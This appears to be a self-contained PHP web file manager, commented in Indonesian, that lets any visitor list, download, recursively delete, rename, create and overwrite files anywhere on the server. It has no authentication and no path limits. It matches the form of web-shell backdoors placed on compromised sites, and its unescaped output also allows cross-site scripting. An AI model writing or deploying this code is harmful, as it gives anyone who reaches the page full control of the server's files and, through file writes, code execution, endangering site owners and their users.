<?php
// Fungsi untuk mendapatkan daftar file dan folder di jalur tertentu
function getFiles($path)
{
    $files = scandir($path);
    $fileList = [];

    foreach ($files as $file) {
        if ($file != '.' && $file != '..') {
            $filePath = $path . '/' . $file;
            $fileInfo = [
                'name' => $file,
                'path' => $filePath,
                'type' => is_dir($filePath) ? 'folder' : 'file',
            ];
            array_push($fileList, $fileInfo);
        }
    }

    return $fileList;
}

// Fungsi untuk menghapus file atau folder
function deleteFile($path)
{
    if (is_file($path)) {
        return unlink($path);
    } elseif (is_dir($path)) {
        $files = array_diff(scandir($path), array('.', '..'));

        foreach ($files as $file) {
            deleteFile($path . '/' . $file);
        }

        return rmdir($path);
    }

    return false;
}

// Fungsi untuk mengganti nama file atau folder
function renameFile($oldPath, $newPath)
{
    return rename($oldPath, $newPath);
}

// Fungsi untuk membuat file baru
function createFile($path, $filename)
{
    $filePath = $path . '/' . $filename;
    return touch($filePath);
}

// Fungsi untuk membuat folder baru
function createDirectory($path, $dirname)
{
    $dirPath = $path . '/' . $dirname;
    return mkdir($dirPath);
}

// Fungsi untuk mengedit isi file
function editFile($filePath, $content)
{
    return file_put_contents($filePath, $content);
}

// Menangani permintaan aksi dari form
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['action'])) {
    $action = $_POST['action'];
    $path = isset($_POST['path']) ? $_POST['path'] : '';

    if ($action === 'getFiles') {
        $fileList = getFiles($path);
        echo json_encode($fileList);
        exit;
    } elseif ($action === 'delete' && isset($_POST['deletePath'])) {
        $deletePath = $_POST['deletePath'];
        $success = deleteFile($deletePath);

        if ($success) {
            echo 'File atau folder berhasil dihapus.';
        } else {
            echo 'Tidak dapat menghapus file atau folder.';
        }
        exit;
    } elseif ($action === 'rename' && isset($_POST['oldPath']) && isset($_POST['newPath'])) {
        $oldPath = $_POST['oldPath'];
        $newPath = $_POST['newPath'];
        $success = renameFile($oldPath, $newPath);

        if ($success) {
            echo 'File atau folder berhasil diubah namanya.';
        } else {
            echo 'Tidak dapat mengganti nama file atau folder.';
        }
        exit;
    } elseif ($action === 'createFile' && isset($_POST['filename'])) {
        $filename = $_POST['filename'];
        $success = createFile($path, $filename);

        if ($success) {
            echo 'File berhasil dibuat.';
        } else {
            echo 'Tidak dapat membuat file.';
        }
        exit;
    } elseif ($action === 'createDirectory' && isset($_POST['dirname'])) {
        $dirname = $_POST['dirname'];
        $success = createDirectory($path, $dirname);

        if ($success) {
            echo 'Folder berhasil dibuat.';
        } else {
            echo 'Tidak dapat membuat folder.';
        }
        exit;
    } elseif ($action === 'editFile' && isset($_POST['filePath']) && isset($_POST['content'])) {
        $filePath = $_POST['filePath'];
        $content = $_POST['content'];
        $success = editFile($filePath, $content);

        if ($success) {
            echo 'File berhasil diedit.';
        } else {
            echo 'Tidak dapat mengedit file.';
        }
        exit;
    }
}

// Fungsi untuk menampilkan daftar folder
function listDirectories($path)
{
    $directories = glob($path . '/*', GLOB_ONLYDIR);
    foreach ($directories as $directory) {
        $directoryName = basename($directory);
        echo '<li>';
        echo '<span class="file-icon">';
        echo '<img src="https://img.icons8.com/color/48/000000/folder-invoices.png" alt="Ikon Folder">';
        echo '</span>';
        echo '<span class="file-name">' . $directoryName . '</span>';
        echo '<a href="?path=' . $directory . '">Lihat</a>';
        echo '</li>';
    }
}

// Fungsi untuk menampilkan daftar file
function listFiles($path)
{
    $files = glob($path . '/*');
    foreach ($files as $file) {
        if (!is_dir($file)) {
            $fileName = basename($file);
            echo '<li>';
            echo '<span class="file-icon">';
            echo '<img src="https://img.icons8.com/color/48/000000/file.png" alt="Ikon File">';
            echo '</span>';
            echo '<span class="file-name">' . $fileName . '</span>';
            echo '<a href="' . $file . '" download>Unduh</a>';
            echo '</li>';
        }
    }
}

// Jalur awal
$initialPath = isset($_GET['path']) ? $_GET['path'] : __DIR__;
$fileList = getFiles($initialPath);
?>

<!DOCTYPE html>
<html>
<head>
    <title>File Manager Mini</title>
    <style>
        body {
            background-color: #000000;
            color: white;
            font-family: Arial, sans-serif;
            margin: 20px;
        }

        h1 {
            margin-bottom: 20px;
        }

        .file-list {
            list-style-type: none;
            padding: 0;
        }

        .file-list li {
            display: flex;
            align-items: center;
            margin-bottom: 5px;
        }

        .file-list li .file-icon {
            margin-right: 10px;
        }

        .file-list li .file-name {
            flex-grow: 1;
        }

        .actions {
            margin-top: 10px;
        }

        .actions input[type="text"] {
            margin-right: 10px;
        }

        .actions input[type="submit"] {
            cursor: pointer;
        }
    </style>
</head>
<body>
<h1>Manajer File</h1>

<div class="current-directory">
    Direktori saat ini: <?php echo realpath($initialPath); ?>
</div>

<ul class="file-list">
    <?php listDirectories($initialPath); ?>
    <?php listFiles($initialPath); ?>
</ul>

<div class="actions">
    <form method="POST" enctype="multipart/form-data">
        <input type="hidden" name="action" value="delete">
        <input type="hidden" name="path" value="<?php echo $initialPath; ?>">
        <input type="text" name="deletePath" placeholder="Masukkan jalur file atau folder untuk dihapus" required>
        <input type="submit" value="Hapus">
    </form>
    <form method="POST" enctype="multipart/form-data">
        <input type="hidden" name="action" value="rename">
        <input type="hidden" name="path" value="<?php echo $initialPath; ?>">
        <input type="text" name="oldPath" placeholder="Jalur file atau folder lama" required>
        <input type="text" name="newPath" placeholder="Jalur file atau folder baru" required>
        <input type="submit" value="Ganti Nama">
    </form>
    <form method="POST" enctype="multipart/form-data">
        <input type="hidden" name="action" value="createFile">
        <input type="hidden" name="path" value="<?php echo $initialPath; ?>">
        <input type="text" name="filename" placeholder="Nama file baru" required>
        <input type="submit" value="Buat File">
    </form>
    <form method="POST" enctype="multipart/form-data">
        <input type="hidden" name="action" value="createDirectory">
        <input type="hidden" name="path" value="<?php echo $initialPath; ?>">
        <input type="text" name="dirname" placeholder="Nama folder baru" required>
        <input type="submit" value="Buat Folder">
    </form>
    <form method="POST" enctype="multipart/form-data">
        <input type="hidden" name="action" value="editFile">
        <input type="hidden" name="path" value="<?php echo $initialPath; ?>">
        <input type="text" name="filePath" placeholder="Jalur file yang akan diedit" required>
        <textarea name="content" rows="5" cols="40" placeholder="Isi baru file" required></textarea>
        <input type="submit" value="Simpan Perubahan">
    </form>
</div>

</body>
</html>
